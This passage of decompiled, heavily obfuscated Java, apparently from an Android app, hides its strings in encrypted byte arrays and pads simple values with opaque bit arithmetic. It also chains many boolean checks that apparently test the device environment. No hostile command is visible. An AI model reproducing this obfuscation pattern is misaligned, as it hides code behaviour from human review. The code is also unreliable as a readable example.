                    bArr2[9] = 18;
                    bArr2[10] = 77;
                    long j133 = 337643534;
                    long j134 = -1;
                    long j135 = (((((j134 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j136 = (((((((j134 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j137 = j136 + j135;
                    long j138 = (((((((j134 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j139 = j138 | j137;
                    long j140 = (((((((j134 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j141 = ((((((((j133 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j133 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j133 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j133 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (j140 | j139);
                    long j142 = (j141 >>> 48) & 43690;
                    long j143 = ((j142 >>> 2) | (j142 >>> 1)) & 858993459;
                    long j144 = ((j143 >>> 2) | j143) & 252645135;
                    long j145 = (j141 >>> 32) & 43690;
                    long j146 = ((j145 >>> 2) | (j145 >>> 1)) & 858993459;
                    long j147 = ((j146 >>> 2) | j146) & 252645135;
                    long j148 = ((((j147 >>> 4) | j147) & 16711935) << 16) + ((((j144 >>> 4) | j144) & 16711935) << 24);
                    long j149 = (j141 >>> 16) & 43690;
                    long j150 = ((j149 >>> 2) | (j149 >>> 1)) & 858993459;
                    long j151 = ((j150 >>> 2) | j150) & 252645135;
                    long j152 = j141 & 43690;
                    long j153 = ((j152 >>> 2) | (j152 >>> 1)) & 858993459;
                    long j154 = ((j153 >>> 2) | j153) & 252645135;
                    bArr2[(((int) ((((j154 >>> 4) | j154) & 16711935) + (((((j151 >>> 4) | j151) & 16711935) << 8) + j148))) + 587206784) ^ 924850309] = -13;
                    bArr2[12] = -48;
                    bArr2[13] = 47;
                    bArr2[14] = -25;
                    bArr2[15] = 106;
                    long j155 = -1974956028;
                    long j156 = 0;
                    long j157 = (((((j156 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j158 = (((((((j156 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j159 = (((((((j156 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j160 = (((((((j156 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j161 = (((((((((j155 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j155 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j155 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j155 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (j160 | (j159 + j158 + j157)) + 6148914691236517205L;
                    long j162 = (j161 >>> 48) & 43690;
                    long j163 = ((j162 >>> 2) | (j162 >>> 1)) & 858993459;
                    long j164 = ((j163 >>> 2) | j163) & 252645135;
                    long j165 = (j161 >>> 32) & 43690;
                    long j166 = ((j165 >>> 2) | (j165 >>> 1)) & 858993459;
                    long j167 = ((j166 >>> 2) | j166) & 252645135;
                    long j168 = ((((j167 >>> 4) | j167) & 16711935) << 16) + ((((j164 >>> 4) | j164) & 16711935) << 24);
                    long j169 = (j161 >>> 16) & 43690;
                    long j170 = ((j169 >>> 2) | (j169 >>> 1)) & 858993459;
                    long j171 = ((j170 >>> 2) | j170) & 252645135;
                    long j172 = j161 & 43690;
                    long j173 = ((j172 >>> 2) | (j172 >>> 1)) & 858993459;
                    long j174 = ((j173 >>> 2) | j173) & 252645135;
                    int i7 = (int) ((((j174 >>> 4) | j174) & 16711935) + (((((j171 >>> 4) | j171) & 16711935) << 8) | j168));
                    long j175 = -1140935892;
                    long j176 = (i7 & 834020152) + (i7 | 834020152);
                    long j177 = ((((((((j175 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j175 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j175 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j175 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j176 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j176 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j176 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j176 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j178 = (j177 >>> 48) & 21845;
                    long j179 = ((j178 >>> 1) | j178) & 858993459;
                    long j180 = ((j179 >>> 2) | j179) & 252645135;
                    long j181 = (j177 >>> 32) & 21845;
                    long j182 = ((j181 >>> 1) | j181) & 858993459;
                    long j183 = ((j182 >>> 2) | j182) & 252645135;
                    long j184 = ((((j183 >>> 4) | j183) & 16711935) << 16) + ((((j180 >>> 4) | j180) & 16711935) << 24);
                    long j185 = (j177 >>> 16) & 21845;
                    long j186 = ((j185 >>> 1) | j185) & 858993459;
                    long j187 = ((j186 >>> 2) | j186) & 252645135;
                    long j188 = j177 & 21845;
                    long j189 = ((j188 >>> 1) | j188) & 858993459;
                    long j190 = ((j189 >>> 2) | j189) & 252645135;
                    bArr2[(int) (((((j187 >>> 4) | j187) & 16711935) << 8) | j184 | (((j190 >>> 4) | j190) & 16711935))] = 47;
                    bArr2[17] = -126;
                    bArr2[18] = -37;
                    bArr2[19] = 82;
                    bArr2[20] = -116;
                    bArr2[21] = 117;
                    bArr2[22] = Byte.MIN_VALUE;
                    long j191 = -1722472792;
                    long j192 = (((((((((j191 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j191 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j191 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j191 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (j140 | (j138 + j137)) + 6148914691236517205L;
                    long j193 = (j192 >>> 48) & 43690;
                    long j194 = ((j193 >>> 2) | (j193 >>> 1)) & 858993459;
                    long j195 = ((j194 >>> 2) | j194) & 252645135;
                    long j196 = (j192 >>> 32) & 43690;
                    long j197 = ((j196 >>> 2) | (j196 >>> 1)) & 858993459;
                    long j198 = ((j197 >>> 2) | j197) & 252645135;
                    long j199 = ((((j198 >>> 4) | j198) & 16711935) << 16) + ((((j195 >>> 4) | j195) & 16711935) << 24);
                    long j200 = (j192 >>> 16) & 43690;
                    long j201 = ((j200 >>> 2) | (j200 >>> 1)) & 858993459;
                    long j202 = ((j201 >>> 2) | j201) & 252645135;
                    long j203 = j192 & 43690;
                    long j204 = ((j203 >>> 2) | (j203 >>> 1)) & 858993459;
                    long j205 = ((j204 >>> 2) | j204) & 252645135;
                    byte[] bArr3 = new byte[((((int) ((((j205 >>> 4) | j205) & 16711935) | (((((j202 >>> 4) | j202) & 16711935) << 8) + j199))) & 296482) + 136855556) ^ 137152049];
                    bArr3[0] = -63;
                    bArr3[1] = -25;
                    long j206 = j159 | j158 | j157;
                    long j207 = j160 + j206;
                    long j208 = j136 | j135;
                    long j209 = (j140 | j138 | j208) + j207;
                    long j210 = (j209 >>> 48) & 21845;
                    long j211 = ((j210 >>> 1) | j210) & 858993459;
                    long j212 = ((j211 >>> 2) | j211) & 252645135;
                    long j213 = (j209 >>> 32) & 21845;
                    long j214 = ((j213 >>> 1) | j213) & 858993459;
                    long j215 = ((j214 >>> 2) | j214) & 252645135;
                    long j216 = ((((j215 >>> 4) | j215) & 16711935) << 16) | ((((j212 >>> 4) | j212) & 16711935) << 24);
                    long j217 = (j209 >>> 16) & 21845;
                    long j218 = ((j217 >>> 1) | j217) & 858993459;
                    long j219 = ((j218 >>> 2) | j218) & 252645135;
                    long j220 = j209 & 21845;
                    long j221 = ((j220 >>> 1) | j220) & 858993459;
                    long j222 = ((j221 >>> 2) | j221) & 252645135;
                    bArr3[2] = (((((int) ((((j222 >>> 4) | j222) & 16711935) | (((((j219 >>> 4) | j219) & 16711935) << 8) + j216))) | 2057973618) & (-1441569704)) + 1090782114) ^ (-350787615);
                    bArr3[3] = -27;
                    bArr3[4] = -95;
                    bArr3[5] = -2;
                    bArr3[6] = 104;
                    bArr3[7] = -4;
                    long j223 = j138 + j208;
                    long j224 = (j140 | j223) + j207;
                    long j225 = (j224 >>> 48) & 21845;
                    long j226 = ((j225 >>> 1) | j225) & 858993459;
                    long j227 = ((j226 >>> 2) | j226) & 252645135;
                    long j228 = (j224 >>> 32) & 21845;
                    long j229 = ((j228 >>> 1) | j228) & 858993459;
                    long j230 = ((j229 >>> 2) | j229) & 252645135;
                    long j231 = ((((j230 >>> 4) | j230) & 16711935) << 16) | ((((j227 >>> 4) | j227) & 16711935) << 24);
                    long j232 = (j224 >>> 16) & 21845;
                    long j233 = ((j232 >>> 1) | j232) & 858993459;
                    long j234 = ((j233 >>> 2) | j233) & 252645135;
                    long j235 = j224 & 21845;
                    long j236 = ((j235 >>> 1) | j235) & 858993459;
                    long j237 = ((j236 >>> 2) | j236) & 252645135;
                    bArr3[(((((int) ((((j237 >>> 4) | j237) & 16711935) + (((((j234 >>> 4) | j234) & 16711935) << 8) | j231))) | 1726236145) & 10791073) + 1393557510) ^ 1404348591] = -127;
                    bArr3[9] = 90;
                    bArr3[10] = 77;
                    bArr3[11] = -110;
                    long j238 = j160 | j206;
                    long j239 = j140 + j139 + j238;
                    long j240 = (j239 >>> 48) & 21845;
                    long j241 = (j240 | (j240 >>> 1)) & 858993459;
                    long j242 = (j241 | (j241 >>> 2)) & 252645135;
                    long j243 = (j239 >>> 32) & 21845;
                    long j244 = ((j243 >>> 1) | j243) & 858993459;
                    long j245 = ((j244 >>> 2) | j244) & 252645135;
                    long j246 = ((((j245 >>> 4) | j245) & 16711935) << 16) + (((j242 | (j242 >>> 4)) & 16711935) << 24);
                    long j247 = (j239 >>> 16) & 21845;
                    long j248 = ((j247 >>> 1) | j247) & 858993459;
                    long j249 = ((j248 >>> 2) | j248) & 252645135;
                    long j250 = ((((j249 >>> 4) | j249) & 16711935) << 8) + j246;
                    long j251 = j239 & 21845;
                    long j252 = ((j251 >>> 1) | j251) & 858993459;
                    long j253 = ((j252 >>> 2) | j252) & 252645135;
                    int i8 = (((int) ((((j253 >>> 4) | j253) & 16711935) + j250)) | (-1724971865)) & 1145377866;
                    bArr3[12] = (-1707545709) ^ (((562167808 | i8) * 2) - (i8 ^ 562167808));
                    bArr3[13] = -14;
                    bArr3[14] = -127;
                    bArr3[15] = -51;
                    bArr3[16] = -32;
                    long j254 = j140 + j223 + j238;
                    long j255 = (j254 >>> 48) & 21845;
                    long j256 = (j255 | (j255 >>> 1)) & 858993459;
                    long j257 = (j256 | (j256 >>> 2)) & 252645135;
                    long j258 = (j254 >>> 32) & 21845;
                    long j259 = (j258 | (j258 >>> 1)) & 858993459;
                    long j260 = (j259 | (j259 >>> 2)) & 252645135;
                    long j261 = (((j260 | (j260 >>> 4)) & 16711935) << 16) + (((j257 | (j257 >>> 4)) & 16711935) << 24);
                    long j262 = (j254 >>> 16) & 21845;
                    long j263 = (j262 | (j262 >>> 1)) & 858993459;
                    long j264 = (j263 | (j263 >>> 2)) & 252645135;
                    long j265 = j254 & 21845;
                    long j266 = (j265 | (j265 >>> 1)) & 858993459;
                    long j267 = (j266 | (j266 >>> 2)) & 252645135;
                    int i9 = (int) (((j267 | (j267 >>> 4)) & 16711935) + (((j264 | (j264 >>> 4)) & 16711935) << 8) + j261);
                    bArr3[842593608 ^ (((271631369 - (i9 | 464772143)) + (464772142 | i9)) + 570962256)] = 71;
                    bArr3[18] = -65;
                    bArr3[19] = 99;
                    bArr3[20] = -122;
                    bArr3[21] = -69;
                    bArr3[22] = -64;
                    k(bArr2, bArr3);
                    Charset charset = StandardCharsets.UTF_8;
                    String intern = new String(bArr2, charset).intern();
                    byte[] bArr4 = {-4, -68, 79, -81, 17, -117, -121, 112, 8, -24, -77, -25, 61, -42, 53, 64, 43, 67, -97, 106, -108, 36, -1, 30, -114, 98};
                    byte[] bArr5 = new byte[26];
                    bArr5[0] = -43;
                    bArr5[1] = 18;
                    bArr5[2] = -25;
                    bArr5[3] = -106;
                    bArr5[4] = 88;
                    bArr5[5] = -95;
                    bArr5[6] = 87;
                    bArr5[7] = -9;
                    bArr5[8] = -62;
                    bArr5[9] = 77;
                    bArr5[10] = -90;
                    bArr5[11] = 2;
                    bArr5[12] = 55;
                    bArr5[V2.a(436495935, -1142948105, -1579444040) ^ 1579444037] = -99;
                    bArr5[14] = -56;
                    bArr5[15] = 119;
                    bArr5[16] = -29;
                    bArr5[17] = -51;
                    bArr5[18] = -27;
                    bArr5[19] = -125;
                    bArr5[20] = -94;
                    bArr5[21] = -15;
                    bArr5[22] = 106;
                    bArr5[23] = -72;
                    bArr5[24] = -49;
                    bArr5[25] = -79;
                    k(bArr4, bArr5);
                    t(intern, new String(bArr4, charset).intern());
                    c4 = 52377;
                case 35578:
                    if (z4) {
                        c4 = 42838;
                        z3 = z4;
                    } else {
                        z3 = z4;
                        c4 = 52377;
                    }
                default:
                    c4 = 35578;
            }
            return z3;
        }
    }

    public final boolean Z() {
        byte[] bArr = new byte[13];
        bArr[0] = 58;
        bArr[1] = -7;
        bArr[2] = -87;
        bArr[3] = 13;
        bArr[4] = 56;
        long j2 = 1150095648;
        long j3 = 0;
        long j4 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
        long j5 = (j4 >>> 48) & 43690;
        long j6 = ((j5 >>> 2) | (j5 >>> 1)) & 858993459;
        long j7 = ((j6 >>> 2) | j6) & 252645135;
        long j8 = (j4 >>> 32) & 43690;
        long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
        long j10 = ((j9 >>> 2) | j9) & 252645135;
        long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) + ((((j7 >>> 4) | j7) & 16711935) << 24);
        long j12 = (j4 >>> 16) & 43690;
        long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
        long j14 = ((j13 >>> 2) | j13) & 252645135;
        long j15 = j4 & 43690;
        long j16 = ((j15 >>> 2) | (j15 >>> 1)) & 858993459;
        long j17 = ((j16 >>> 2) | j16) & 252645135;
        bArr[(-409002579) ^ ((-1559098232) + ((int) ((((j17 >>> 4) | j17) & 16711935) | (((((j14 >>> 4) | j14) & 16711935) << 8) | j11))))] = -39;
        bArr[6] = 2;
        bArr[7] = -17;
        bArr[8] = 14;
        bArr[9] = -120;
        bArr[10] = 31;
        bArr[11] = 75;
        bArr[12] = 46;
        long j18 = -772521788;
        long j19 = -772521752;
        long j20 = ((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j21 = (j20 >>> 48) & 21845;
        long j22 = ((j21 >>> 1) | j21) & 858993459;
        long j23 = ((j22 >>> 2) | j22) & 252645135;
        long j24 = (j20 >>> 32) & 21845;
        long j25 = ((j24 >>> 1) | j24) & 858993459;
        long j26 = ((j25 >>> 2) | j25) & 252645135;
        long j27 = ((((j26 >>> 4) | j26) & 16711935) << 16) + ((((j23 >>> 4) | j23) & 16711935) << 24);
        long j28 = (j20 >>> 16) & 21845;
        long j29 = ((j28 >>> 1) | j28) & 858993459;
        long j30 = ((j29 >>> 2) | j29) & 252645135;
        long j31 = j20 & 21845;
        long j32 = ((j31 >>> 1) | j31) & 858993459;
        long j33 = ((j32 >>> 2) | j32) & 252645135;
        byte b4 = (int) ((((j33 >>> 4) | j33) & 16711935) + ((((j30 >>> 4) | j30) & 16711935) << 8) + j27);
        long j34 = 1935447504;
        long j35 = -1935447525;
        long j36 = (((((((((j34 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j34 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j34 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j34 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j35 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j35 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j35 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j35 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j37 = (j36 >>> 48) & 21845;
        long j38 = ((j37 >>> 1) | j37) & 858993459;
        long j39 = ((j38 >>> 2) | j38) & 252645135;
        long j40 = (j36 >>> 32) & 21845;
        long j41 = ((j40 >>> 1) | j40) & 858993459;
        long j42 = ((j41 >>> 2) | j41) & 252645135;
        long j43 = ((((j42 >>> 4) | j42) & 16711935) << 16) + ((((j39 >>> 4) | j39) & 16711935) << 24);
        long j44 = (j36 >>> 16) & 21845;
        long j45 = ((j44 >>> 1) | j44) & 858993459;
        long j46 = ((j45 >>> 2) | j45) & 252645135;
        long j47 = j36 & 21845;
        long j48 = ((j47 >>> 1) | j47) & 858993459;
        long j49 = ((j48 >>> 2) | j48) & 252645135;
        z(bArr, new byte[]{b4, -92, 9, (int) ((((j49 >>> 4) | j49) & 16711935) | (((((j46 >>> 4) | j46) & 16711935) << 8) + j43)), 49, -119, -27, 38, 5, -57, -53, -123, 75});
        Charset charset = StandardCharsets.UTF_8;
        if (!Integer.valueOf(AbstractC0044j.b(new String(bArr, charset).intern())).equals(1)) {
            return false;
        }
        byte[] bArr2 = new byte[23];
        bArr2[0] = -108;
        bArr2[1] = 96;
        bArr2[2] = -52;
        bArr2[3] = 29;
        bArr2[4] = 114;
        long j50 = 1412730037;
        long j51 = -1;
        long j52 = ((((((((j50 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j50 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j50 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j50 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j51 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j51 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j51 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j51 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
        long j53 = (j52 >>> 48) & 43690;
        long j54 = ((j53 >>> 2) | (j53 >>> 1)) & 858993459;
        long j55 = ((j54 >>> 2) | j54) & 252645135;
        long j56 = (j52 >>> 32) & 43690;
        long j57 = ((j56 >>> 2) | (j56 >>> 1)) & 858993459;
        long j58 = ((j57 >>> 2) | j57) & 252645135;
        long j59 = ((((j58 >>> 4) | j58) & 16711935) << 16) + ((((j55 >>> 4) | j55) & 16711935) << 24);
        long j60 = (j52 >>> 16) & 43690;
        long j61 = ((j60 >>> 2) | (j60 >>> 1)) & 858993459;
        long j62 = ((j61 >>> 2) | j61) & 252645135;
        long j63 = j52 & 43690;
        long j64 = ((j63 >>> 2) | (j63 >>> 1)) & 858993459;
        long j65 = ((j64 >>> 2) | j64) & 252645135;
        int i = (int) ((((j65 >>> 4) | j65) & 16711935) | ((((j62 >>> 4) | j62) & 16711935) << 8) | j59);
        long j66 = -1810788108;
        long j67 = 0;
        long j68 = ((((((((j66 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j66 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j66 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j66 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j67 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j67 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j67 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j67 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j69 = (j68 >>> 48) & 43690;
        long j70 = ((j69 >>> 2) | (j69 >>> 1)) & 858993459;
        long j71 = (j70 | (j70 >>> 2)) & 252645135;
        long j72 = (j68 >>> 32) & 43690;
        long j73 = ((j72 >>> 2) | (j72 >>> 1)) & 858993459;
        long j74 = ((j73 >>> 2) | j73) & 252645135;
        long j75 = (((j71 | (j71 >>> 4)) & 16711935) << 24) | ((((j74 >>> 4) | j74) & 16711935) << 16);
        long j76 = (j68 >>> 16) & 43690;
        long j77 = ((j76 >>> 2) | (j76 >>> 1)) & 858993459;
        long j78 = ((j77 >>> 2) | j77) & 252645135;
        long j79 = j68 & 43690;
        long j80 = ((j79 >>> 2) | (j79 >>> 1)) & 858993459;
        long j81 = (j80 | (j80 >>> 2)) & 252645135;
        int a2 = S.a((int) (((j81 | (j81 >>> 4)) & 16711935) + (j75 | ((((j78 >>> 4) | j78) & 16711935) << 8))), ((-r9) - 1) | 1476325311, -1476325311, i);
        bArr2[(a2 - 63595280) - ((a2 & (-63595280)) * 2)] = 111;
        bArr2[6] = 21;
        bArr2[7] = -74;
        bArr2[8] = 101;
        bArr2[9] = -76;
        bArr2[10] = 90;
        bArr2[11] = 11;
        bArr2[12] = -20;
        bArr2[13] = 6;
        bArr2[14] = 55;
        bArr2[15] = -28;
        bArr2[16] = -11;
        bArr2[17] = -51;
        bArr2[18] = -43;
        bArr2[19] = 11;
        bArr2[20] = -70;
        bArr2[21] = -64;
        bArr2[22] = -47;
        z(bArr2, new byte[]{-109, 54, 27, -40, 125, 81, -15, 103, 113, -25, -66, -35, -15, 52, -32, 32, -20, -104, 12, -56, -40, -84, -76});
        String intern = new String(bArr2, charset).intern();
        byte[] bArr3 = {-76, 112, 62, 36};
        z(bArr3, new byte[]{-84, 16, -39, -29, 50, -38, -14, 100});
        t(intern, new String(bArr3, charset).intern());
        return true;
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:159:0x0445. Please report as an issue. */
    /* JADX WARN: Failed to find 'out' block for switch in B:26:0x04f1. Please report as an issue. */
    /* JADX WARN: Multi-variable type inference failed */
    @Override // F0.T2
    public final void a(Context context) {
        char c4;
        char c5;
        int i;
        int i3;
        int i4;
        char c6 = 64439;
        char c7 = 64439;
        C0031f2 c0031f2 = null;
        while (c7 != 50595) {
            if (c7 == 53888) {
                return;
            }
            if (c7 == c6) {
                long nanoTime = System.nanoTime() / 1000000;
                int i5 = (c0() ? 1 : 0) | (E(context) ? 1 : 0);
                byte[] bArr = {-74, 88, 91, -18, 53, 119, -45, -47, 27};
                k(bArr, new byte[]{12, 126, -35, 46, -124, 51, 3, -51, -102});
                Charset charset = StandardCharsets.UTF_8;
                String intern = new String(bArr, charset).intern();
                byte[] bArr2 = {-8};
                k(bArr2, new byte[]{-81, -56, 66, 23, -94, -47, 24, -104});
                int i6 = i5 | (J(intern, new String(bArr2, charset).intern()) ? 1 : 0) | (K() ? 1 : 0);
                String[] strArr = V.f390a;
                int length = strArr.length;
                int i7 = 0;
                while (true) {
                    if (i7 >= length) {
                        i = 0;
                    } else if (M(strArr[i7])) {
                        i = 1;
                    } else {
                        i7++;
                    }
                }
                int i8 = (~(((~i) | i6) - i6)) | (a0() ? 1 : 0);
                boolean Y3 = Y();
                int i9 = ((Y3 ? 1 : 0) + i8) - (i8 & (Y3 ? 1 : 0));
                long j2 = O() ? 1L : 0L;
                long j3 = i9;
                long j4 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + 6148914691236517205L;
                long j5 = (j4 >>> 48) & 43690;
                long j6 = ((j5 >>> 2) | (j5 >>> 1)) & 858993459;
                long j7 = ((j6 >>> 2) | j6) & 252645135;
                long j8 = (j4 >>> 32) & 43690;
                long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
                long j10 = ((j9 >>> 2) | j9) & 252645135;
                long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) + ((((j7 >>> 4) | j7) & 16711935) << 24);
                long j12 = (j4 >>> 16) & 43690;
                long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
                long j14 = ((j13 >>> 2) | j13) & 252645135;
                long j15 = j4 & 43690;
                long j16 = ((j15 >>> 2) | (j15 >>> 1)) & 858993459;
                long j17 = ((j16 >>> 2) | j16) & 252645135;
                int i10 = ((int) ((((j17 >>> 4) | j17) & 16711935) | (((((j14 >>> 4) | j14) & 16711935) << 8) + j11))) | (G(context) ? 1 : 0) | (F() ? 1 : 0) | (C(context) ? 1 : 0) | (H(context) ? 1 : 0) | (f0() ? 1 : 0);
